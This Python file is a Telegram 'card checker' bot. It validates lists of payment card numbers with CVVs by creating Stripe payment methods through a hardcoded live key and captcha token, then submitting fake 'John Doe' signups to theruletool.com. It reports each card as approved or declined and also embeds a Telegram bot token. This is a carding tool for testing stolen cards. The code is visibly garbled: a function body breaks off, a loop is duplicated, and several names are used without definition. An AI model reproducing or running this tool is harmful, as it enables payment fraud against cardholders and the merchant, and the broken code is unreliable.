import re
import time
import threading
import random
import string
import requests
import telebot

BOT_TOKEN = '7621706011:AAE8N5F-uz1CNQ2T4QrXqKP7sTxuSeM-YgE'
bot = telebot.TeleBot(BOT_TOKEN)

user_stop_flag = {}
processing_status = {}

def random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{username}@gmail.com"

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

def get_stripe_pm(email, cc, mm, yy, cvv):
    from uuid import uuid4
    guid = str(uuid4())
    muid = str(uuid4())
    sid = str(uuid4())
    phone = "(314)474-6658"
    data = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[name]": "John Doe",
        "billing_details[phone]": phone,
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy[-2:],
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element",
        "referrer": "https://app.theruletool.com",
        "time_on_page": str(random.randint(10000, 99999)),
        "key": "pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA",
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVmdQZFJwRjhFUjhuU2t6V2h6bjdtZklPNzliOGZJVFBpcnFoUTJXQWJtRG4rSEFHNVQwcTVoZFU2WlRlVDZ6NGNGMEUrdWpWbWVRbnVkWVBueEM1R0pGNEZLdU44Y2crcHBpZ3Uza00zNFpxMUdFWnV2eEpnY2pJeVFUTlBrR3VBVVI0anArb3R5RTdsMDJtVjZ0SFpkbXJvSEs1QVBDY3BOSVMwdFZSMUk2cFRtS3RDTUtKZEJNSlp3VVdHc1pseVlwcEsxYkVyampjUFVSTk9sK1RuUUZsbTROY0ZtNkRGT0trT0VaQVZCNERjbG45RDE4RGU1b1M5MlYxMXZyUWx6bTYvdXRaRDhGRTV4VGQyY01CbXR3WjlUclBwNjBsaXREcC8xbmxRSlNqaG93ekZSM1lzNkpZVFozRTlHTENZL3lseXNXclFaZE10M2FyNnd0RkhmNXZvUWI5UjZkb3FmYUNUT0c1b1M0MjluYzlDZmF4MVpuRTMzenJOdlZNQmFxUERxQ2VGb3Vmc2FBTlhiNnAwbXIwa0Zib3pCZ1NuM0dyaWdvVC9zbDIzSDQvekt2SWtpL0s0cTVhdG5XZXNjcVprMmJwU0hLS0IwTUUvT21Oc1ZEVWdGNUpvNEhLb0wzdlZhaSs3WWVZMTVnOFNFUElVNERKVlppTmMzQ2tKWFlDSWI3NjJmdzUyaHdWWjRWalBtdElZZXM3R0loWUJxRjJJazRLZXl2ME8wZ1JOME5MOXUvU2orWFg4SzcrVjVYMXBzdkJWb1BKS1RYWjI0SHlpYkVUQUtoNEduZml2UEVWcnZtdC83N2ZmakhYUzhCck4wc2dzWkhqUDVKZzN0ZkxWZ2N0SjR5WmxkdHVRNHV3VnB4WGZocjQ3K3hOWjBjU0hVbVZYNDBMelBwOUpMa1NCUDl3WjhlTHZlQ2VYMHMzTVd5YjZ0eUgwU3o0c01xZEJQeGJjTjVCaVRyQ0JSNmcvaG8zSVluSjVIWGF6dmJVL2NxOVFndHVlLzNOVEgxR3BWc0xWaXdVaDBPQUVIS3Q1UXBDTFZEZlQvenNNb2Z1WnFuSlcvakxXVUxaNkxOTjQxQkg4eXBFSHZ0SlVhSlpMb2J1N3dVcE5KNWVRV0J2cVpnaUJnRE5NclFCUm8xUGhtdFE5aFZXYmpMRTBHRmM1ZXFsd3JGYzMwR1Z3amlwcTBYb2lvOWRXNCtNT2xpakZkdlRGNytSRFRqSmJseWlLSmpBVVp2NjVRT2txMkFNMzVRcjFIMElvdW5mVmJuZFZLaVlLMHpGK09tSWUwdEVHN0k4T2pzZFR3a0hJSmh6SlVrZ081Q0Z1YmJ5dWRnNVc0ZDR3OEk3TlhUdk1MYzNpOE9WVnFOc09oWVVSMnprRWxIK0NLNFduWEtFTzBGcmlCSjhKdTBHME9ES0NlS1EvU1hxa2hPdXhxazRtd2NxL25QVm41bnI0Rnk2QmRkTlQzYS81K3BIZWZPSlkwbE9hL0RyV1FxcnRRYVg4NXFqampZeUpETVhxeFJPcm9YSngvNm9iRHYyTW01eVdGamFtZEx3TWJ2NG1NVVFlYnRhUi9vYzQ2bUczS2tMYVNjb2o0MVpuRWdvSnBIRFBvMXZrSUVRRngxTG12b3BiRUtmYnAxWmdrYWFUcWxkek84cjRORGc3SWsyRkJ5K3VINERBb1FvMWNsakdVYm81b2ZIbFM4Q2tIQXZmQ3J2VXpHVGtOb1UxTW1jaE41Mnlva1kra0JJUjNrdUpOUWVlZEhVbHRQTUlNcHY5STJzMmIxUndsSExCRHZNWnQyd1F5b3VyNDZRMUt0bTZmNlZqdEZOVjM5dWJWZjBReVYwMWtESzZtbTB5Y0MzTThTeWlrUXljODdheUlRQysya3RyMDA0d2JqM3g0Qnk2UVA2V0JzeDNyT09ZQUxubTVLYzVkaFZmemtsOGlCT3IzK2xpSStyUCtBQW9IWGYzUXlIOXEyK3BTRExnNEw1YkpRYUhENmtEN0FxeVpJVjRENFZPTUNwZ2JqVW5yOTlyKzJ4bENCQzdjZW1QbGsxZ3BCRTZveXVSN2lZdVRSVFQwZnpIQUVGTGFZekptM1lVRERxNlBGREdqRmpiczEyYzJ6SWpWVWw1NE9PSjhBdmVpRytQR2hJR0FpUTdsQTdVbHd3S1dNVkpqdS9rK3M1TXkycEptUHpFZldSaHBEQXYxVTlPRzhVTFZBeEVOWkp4MEt3eGJ6d3kwVnFvdWtVSkFZSXBUVXhwZitvT1VJS2ZheEtBYWxCTGg2VkdrMnlZWmVJTE83YVIrbUljUW1WT3lRanEzb0RMM0lmU2tYRUhqOW5Kbkx6MEJwaGQ1MEVueG9CcitZQldKNUhPRHFCVUZQUGN2Y3RqWkkyZExzV0h6TU9UK3QwL0tqOVJZajJHeEhET09BQXk4V2taeVN0bVhDS1o3anJ2NC9MSVZpRHBaMU1rVHFNM1BtWVhyUllFZGJUKzdYaEIxY2tVQnVNeElJL2Q2azBOY1AyTytFaG15TTZoZzViZU9PTXJCYlE4OTBReUMxc2plNzVWcjExUDBGb1E5emVhUjVCcFQ0WjNFeVEyNjBaRG1hYjhTcWZ5bkw2NTh1NHhGb1Z5eWs4YVVzOHF2Z0dpK3M3Vzh5K0lmV3JmcjVXempXVlg4ZC9LaGNiQjdVMDdKYjh0ZXBBS2x4ZVlSSXY3cSswWTFCRm90WEo0M2Z5NytrYzNDVzFxUnFBcnBrVFlGZXNONVB3NmVna2FsRDgwVVl1U1UvaUVlUmV3VlVnY0xqMXUwVXdWWFI5ZjBhRFdDMURiWm9rRnhNMnZzN2FLUE9VZVMrY05GaDFkWGpEeFNERTZaUDY3Z2xFRFBHVUFtRTBrQT09IiwiZXhwIjoxNzQ3MDU2NzY0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjRlMzgzYjkiLCJwZCI6MCwiY2RhdGEiOiJ1TjJNM2duZ0pLQi84dHhsV25zbGdEeGt1ZDVTNk5rWEZOTytrbkI2dzREV1ZySFBPN2VwK2tIYTZFZ29lbk5oS0xoZmpWSEJnWTFmRFN0cnVTclRXMkUxMDBoZHhVZ1FqZVExT3FnR1lCOStXeGZxMmJNZko2bTJHcjBvWGd6bGxuT3lka0xDTllhK0F6M2JHM0hMclpuajV3M3dqSmxKVDBLYzJIa3BjaWVBYnJuR1V4dDNVV0UzazROVU1xcHVNK0lqVUlNZ21jNERnc2E1In0.EiL7C4ck57anNNbJufiXcmAwfrq4Vsd1vy92cGiflcg"
    )

    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        data = {
            "type": "card",
            "billing_details[email]": email,
            "billing_details[name]": "John Doe",
            "billing_details[phone]": "(314)474-6658",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy[-2:],
            "guid": str(uuid4()),
            "muid": str(uuid4()),
            "sid": str(uuid4()),
            "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element",
            "referrer": "https://app.theruletool.com",
            "time_on_page": str(random.randint(10000, 99999)),
            "key": "pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA",
            "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVmdQZFJwRjhFUjhuU2t6V2h6bjdtZklPNzliOGZJVFBpcnFoUTJXQWJtRG4rSEFHNVQwcTVoZFU2WlRlVDZ6NGNGMEUrdWpWbWVRbnVkWVBueEM1R0pGNEZLdU44Y2crcHBpZ3Uza00zNFpxMUdFWnV2eEpnY2pJeVFUTlBrR3VBVVI0anArb3R5RTdsMDJtVjZ0SFpkbXJvSEs1QVBDY3BOSVMwdFZSMUk2cFRtS3RDTUtKZEJNSlp3VVdHc1pseVlwcEsxYkVyampjUFVSTk9sK1RuUUZsbTROY0ZtNkRGT0trT0VaQVZCNERjbG45RDE4RGU1b1M5MlYxMXZyUWx6bTYvdXRaRDhGRTV4VGQyY01CbXR3WjlUclBwNjBsaXREcC8xbmxRSlNqaG93ekZSM1lzNkpZVFozRTlHTENZL3lseXNXclFaZE10M2FyNnd0RkhmNXZvUWI5UjZkb3FmYUNUT0c1b1M0MjluYzlDZmF4MVpuRTMzenJOdlZNQmFxUERxQ2VGb3Vmc2FBTlhiNnAwbXIwa0Zib3pCZ1NuM0dyaWdvVC9zbDIzSDQvekt2SWtpL0s0cTVhdG5XZXNjcVprMmJwU0hLS0IwTUUvT21Oc1ZEVWdGNUpvNEhLb0wzdlZhaSs3WWVZMTVnOFNFUElVNERKVlppTmMzQ2tKWFlDSWI3NjJmdzUyaHdWWjRWalBtdElZZXM3R0loWUJxRjJJazRLZXl2ME8wZ1JOME5MOXUvU2orWFg4SzcrVjVYMXBzdkJWb1BKS1RYWjI0SHlpYkVUQUtoNEduZml2UEVWcnZtdC83N2ZmakhYUzhCck4wc2dzWkhqUDVKZzN0ZkxWZ2N0SjR5WmxkdHVRNHV3VnB4WGZocjQ3K3hOWjBjU0hVbVZYNDBMelBwOUpMa1NCUDl3WjhlTHZlQ2VYMHMzTVd5YjZ0eUgwU3o0c01xZEJQeGJjTjVCaVRyQ0JSNmcvaG8zSVluSjVIWGF6dmJVL2NxOVFndHVlLzNOVEgxR3BWc0xWaXdVaDBPQUVIS3Q1UXBDTFZEZlQvenNNb2Z1WnFuSlcvakxXVUxaNkxOTjQxQkg4eXBFSHZ0SlVhSlpMb2J1N3dVcE5KNWVRV0J2cVpnaUJnRE5NclFCUm8xUGhtdFE5aFZXYmpMRTBHRmM1ZXFsd3JGYzMwR1Z3amlwcTBYb2lvOWRXNCtNT2xpakZkdlRGNytSRFRqSmJseWlLSmpBVVp2NjVRT2txMkFNMzVRcjFIMElvdW5mVmJuZFZLaVlLMHpGK09tSWUwdEVHN0k4T2pzZFR3a0hJSmh6SlVrZ081Q0Z1YmJ5dWRnNVc0ZDR3OEk3TlhUdk1MYzNpOE9WVnFOc09oWVVSMnprRWxIK0NLNFduWEtFTzBGcmlCSjhKdTBHME9ES0NlS1EvU1hxa2hPdXhxazRtd2NxL25QVm41bnI0Rnk2QmRkTlQzYS81K3BIZWZPSlkwbE9hL0RyV1FxcnRRYVg4NXFqampZeUpETVhxeFJPcm9YSngvNm9iRHYyTW01eVdGamFtZEx3TWJ2NG1NVVFlYnRhUi9vYzQ2bUczS2tMYVNjb2o0MVpuRWdvSnBIRFBvMXZrSUVRRngxTG12b3BiRUtmYnAxWmdrYWFUcWxkek84cjRORGc3SWsyRkJ5K3VINERBb1FvMWNsakdVYm81b2ZIbFM4Q2tIQXZmQ3J2VXpHVGtOb1UxTW1jaE41Mnlva1kra0JJUjNrdUpOUWVlZEhVbHRQTUlNcHY5STJzMmIxUndsSExCRHZNWnQyd1F5b3VyNDZRMUt0bTZmNlZqdEZOVjM5dWJWZjBReVYwMWtESzZtbTB5Y0MzTThTeWlrUXljODdheUlRQysya3RyMDA0d2JqM3g0Qnk2UVA2V0JzeDNyT09ZQUxubTVLYzVkaFZmemtsOGlCT3IzK2xpSStyUCtBQW9IWGYzUXlIOXEyK3BTRExnNEw1YkpRYUhENmtEN0FxeVpJVjRENFZPTUNwZ2JqVW5yOTlyKzJ4bENCQzdjZW1QbGsxZ3BCRTZveXVSN2lZdVRSVFQwZnpIQUVGTGFZekptM1lVRERxNlBGREdqRmpiczEyYzJ6SWpWVWw1NE9PSjhBdmVpRytQR2hJR0FpUTdsQTdVbHd3S1dNVkpqdS9rK3M1TXkycEptUHpFZldSaHBEQXYxVTlPRzhVTFZBeEVOWkp4MEt3eGJ6d3kwVnFvdWtVSkFZSXBUVXhwZitvT1VJS2ZheEtBYWxCTGg2VkdrMnlZWmVJTE83YVIrbUljUW1WT3lRanEzb0RMM0lmU2tYRUhqOW5Kbkx6MEJwaGQ1MEVueG9CcitZQldKNUhPRHFCVUZQUGN2Y3RqWkkyZExzV0h6TU9UK3QwL0tqOVJZajJHeEhET09BQXk4V2taeVN0bVhDS1o3anJ2NC9MSVZpRHBaMU1rVHFNM1BtWVhyUllFZGJUKzdYaEIxY2tVQnVNeElJL2Q2azBOY1AyTytFaG15TTZoZzViZU9PTXJCYlE4OTBReUMxc2plNzVWcjExUDBGb1E5emVhUjVCcFQ0WjNFeVEyNjBaRG1hYjhTcWZ5bkw2NTh1NHhGb1Z5eWs4YVVzOHF2Z0dpK3M3Vzh5K0lmV3JmcjVXempXVlg4ZC9LaGNiQjdVMDdKYjh0ZXBBS2x4ZVlSSXY3cSswWTFCRm90WEo0M2Z5NytrYzNDVzFxUnFBcnBrVFlGZXNONVB3NmVna2FsRDgwVVl1U1UvaUVlUmV3VlVnY0xqMXUwVXdWWFI5ZjBhRFdDMURiWm9rRnhNMnZzN2FLUE9VZVMrY05GaDFkWGpEeFNERTZaUDY3Z2xFRFBHVUFtRTBrQT09IiwiZXhwIjoxNzQ3MDU2NzY0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjRlMzgzYjkiLCJwZCI6MCwiY2RhdGEiOiJ1TjJNM2duZ0pLQi84dHhsV25zbGdEeGt1ZDVTNk5rWEZOTytrbkI2dzREV1ZySFBPN2VwK2tIYTZFZ29lbk5oS0xoZmpWSEJnWTFmRFN0cnVTclRXMkUxMDBoZHhVZ1FqZVExT3FnR1lCOStXeGZxMmJNZko2bTJHcjBvWGd6bGxuT3lka0xDTllhK0F6M2JHM0hMclpuajV3M3dqSmxKVDBLYzJIa3BjaWVBYnJuR1V4dDNVV0UzazROVU1xcHVNK0lqVUlNZ21jNERnc2E1In0.EiL7C4ck57anNNbJufiXcmAwfrq4Vsd1vy92cGiflcg"
    )

    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        pm_id, stripe_raw = get_stripe_pm(email, cc, mm, yy, cvv)
        if not pm_id or not pm_id.startswith("pm_"):
            bot.send_message(
                chat_id,
                f"Card #{idx}\n"
                f"Number: {cc}|{mm}|{yy}|{cvv}\n"
                f"Email: {email}\n"
                f"Status: ❌ Declined (Stripe error)\n"
                f"Stripe response:\n<code>{stripe_raw}</code>",
                parse_mode="HTML"
            )
            continue

        signup_url = "https://app.theruletool.com/signup/create"
        post_data = (
            f'{{"pm_id":"{pm_id}","email":"{email}","first_name":"John","last_name":"Doe","password":"{random_email()}","confirm_password":"{random_email()}","phone":"(314)474-6658"}}'
        )
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "text/plain;charset=UTF-8",
            "origin": "https://app.theruletool.com",
            "priority": "u=1, i",
            "referer": "https://app.theruletool.com/signup",
            "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            "cookie": f"__stripe_mid={pm_id}; __stripe_sid={pm_id}"
        }
        try:
            resp = requests.post(signup_url, data=post_data, headers=headers, timeout=30)
            resp_text = resp.text
            if '"IsSuccess":true' in resp_text:
                status = "✅ Approved"
            elif '"IsSuccess":false' in resp_text:
                status = "❌ Declined"
            else:
                status = "❓ Unknown"
            bot.send_message(
                chat_id,
                f"Card #{idx}\n"
                f"Number: {cc}|{mm}|{yy}|{cvv}\n"
                f"Email: {email}\n"
                f"Status: {status}\n"
                f"Response:\n<code>{resp_text}</code>",
                parse_mode="HTML"
            )
        except Exception as e:
            bot.send_message(
                chat_id,
                f"❌ Error processing card #{idx}\n"
                f"{cc}|{mm}|{yy}|{cvv}\n"
                f"Error: {str(e)}"
            )

        if idx < len(cards):
            for i in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    user_id = message.from_user.id
    if processing_status.get(user_id):
        bot.send_message(message.chat.id, "⚠️ Already processing cards, please wait")
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Invalid format. Please send cards as:\n"
            "CC|MM|YY|CVV\nCC|MM|YYYY|CVV\n"
            "CC/MM/YY/CVV\nCC/MM/YYYY/CVV"
        )
        return

    processing_status[user_id] = True
    bot.send_message(message.chat.id, f"🔍 Processing {len(cards)} cards...")

    def process_wrapper():
        check_card_flow(message, cards)
        processing_status[user_id] = False

    threading.Thread(target=process_wrapper).start()

if __name__ == '__main__':
    processing_status = {}
    bot.infinity_polling()
